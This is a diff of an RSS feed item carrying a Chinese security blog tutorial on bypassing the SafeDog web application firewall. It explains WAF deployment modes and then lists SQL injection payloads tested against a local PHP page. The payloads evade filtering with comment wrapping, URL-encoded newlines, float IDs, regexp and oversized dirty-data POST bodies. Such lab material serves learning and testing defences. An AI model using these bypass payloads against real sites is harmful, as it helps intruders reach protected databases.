@@ -44,23 +44,35 @@
 <h1 id="waf的几种部署模式" class="headerLink">
     <a href="#waf%e7%9a%84%e5%87%a0%e7%a7%8d%e9%83%a8%e7%bd%b2%e6%a8%a1%e5%bc%8f" class="header-mark"></a>WAF的几种部署模式:</h1><h2 id="基于dns解析" class="headerLink">
     <a href="#%e5%9f%ba%e4%ba%8edns%e8%a7%a3%e6%9e%90" class="header-mark"></a>基于DNS解析</h2><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+        
+    </a></figure></p>
 <h2 id="串联模式" class="headerLink">
     <a href="#%e4%b8%b2%e8%81%94%e6%a8%a1%e5%bc%8f" class="header-mark"></a>串联模式</h2><p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
-</p>
-<p></p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+        
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+        
+    </a></figure></p>
 <h2 id="旁路模式" class="headerLink">
     <a href="#%e6%97%81%e8%b7%af%e6%a8%a1%e5%bc%8f" class="header-mark"></a>旁路模式</h2><p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+        
+    </a></figure></p>
 <h2 id="软件嵌入中间件检测引擎模式" class="headerLink">
     <a href="#%e8%bd%af%e4%bb%b6%e5%b5%8c%e5%85%a5%e4%b8%ad%e9%97%b4%e4%bb%b6%e6%a3%80%e6%b5%8b%e5%bc%95%e6%93%8e%e6%a8%a1%e5%bc%8f" class="header-mark"></a>软件嵌入中间件+检测引擎模式</h2><p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+        
+    </a></figure></p>
 <h1 id="waf为什么会被绕过" class="headerLink">
     <a href="#waf%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e8%a2%ab%e7%bb%95%e8%bf%87" class="header-mark"></a>WAF为什么会被绕过:</h1><ol>
 <li>鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</li>
 <li>WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</li>
 <li>硬件WAF自身往往存在漏洞
-</li>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+        
+    </a></figure></li>
 </ol>
 <ul>
 <li>架构:waf部署模式</li>
@@ -71,7 +83,9 @@
     <a href="#waf%e7%bb%95%e8%bf%87%e5%ae%9e%e6%88%98-%e7%bb%95%e8%bf%87%e5%ae%89%e5%85%a8%e7%8b%97%e8%bf%9b%e8%a1%8c%e6%b3%a8%e5%85%a5" class="header-mark"></a>WAF绕过实战—-绕过安全狗进行注入</h1><p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
 <h2 id="实验环境" class="headerLink">
     <a href="#%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" class="header-mark"></a>实验环境:</h2><p>环境:安全狗Apache最新版
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+        
+    </a></figure></p>
 <p>本地测试代码(PHP):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -111,7 +125,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1  and 1=1%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+        
+    </a></figure></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -162,7 +178,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+        
+    </a></figure></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -190,12 +208,18 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+        
+    </a></figure></p>
 <h2 id="绕过union-select查询" class="headerLink">
     <a href="#%e7%bb%95%e8%bf%87union-select%e6%9f%a5%e8%af%a2" class="header-mark"></a>绕过union select查询</h2><p>使用union xxx页面正常
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/11.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png">
+        
+    </a></figure></p>
 <p>但是用union和select放在在一起就被发现啦
-</p>
+<figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/12.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png">
+        
+    </a></figure></p>
 <p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -205,7 +229,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/13.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png">
+        
+    </a></figure></p>
 <ul>
 <li>对于数字型注入,可以将其转换成浮点型</li>
 <li>联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,</li>
@@ -220,7 +246,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/14.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png">
+        
+    </a></figure></p>
 <p>基于报错信息的注入绕安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -242,7 +270,9 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p></p>
+</div><p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/15.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png">
+        
+    </a></figure></p>
 <p>使用反引号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -302,6 +332,8 @@ php+mysql环境下支持的空格有：</p>
 GET类型请求转换成POST类型
 Content-Length头长度大于4008
 正常参数放置在脏数据后面</p>
-<p></p>]]></description>
+<p><figure><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/16.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png">
+        
+    </a></figure></p>]]></description>
 </item></channel>
 </rss>
